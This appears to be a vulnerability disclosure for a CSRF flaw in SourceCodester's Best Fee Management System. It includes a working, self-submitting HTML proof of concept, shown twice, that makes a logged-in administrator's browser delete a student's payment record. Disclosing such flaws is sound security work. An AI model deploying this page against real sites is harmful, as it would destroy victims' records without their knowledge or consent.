# Summary
SourceCodester Best Fee Management System Project has a CSRF vulnerability in `/click_fees/index.php?page=payments`, which allows attackers to trick administrators who are logged into the site to delete students' payment information.

# Details
In url : `/click_fees/index.php?page=payments`
![image](https://github.com/user-attachments/assets/a996a0a5-feca-4b11-b4a6-d4f9c7b5c157)



Choose module `Courses && Fees` and choose option `delete`:
![image](https://github.com/user-attachments/assets/5330fc41-a4b3-44cb-867a-c7c35a9185c2)


Use burpsuite to intercept, finding that there's no csrf token for protection:
![image](https://github.com/user-attachments/assets/51b33118-c6cc-4f57-86ce-1ae8255e4926)



CSRF PoC:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://fee:84/click_fees/ajax.php?action=delete_payment" method="POST">
      <input type="hidden" name="id" value="5" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![CSRF4_PoC.gif](https://github.com/N0zoM1z0/Vuln-Search/blob/main/CSRF4_PoC.gif)



# PoC
CSRF PoC:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://fee:84/click_fees/ajax.php?action=delete_payment" method="POST">
      <input type="hidden" name="id" value="5" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![CSRF4_PoC.gif](https://github.com/N0zoM1z0/Vuln-Search/blob/main/CSRF4_PoC.gif)
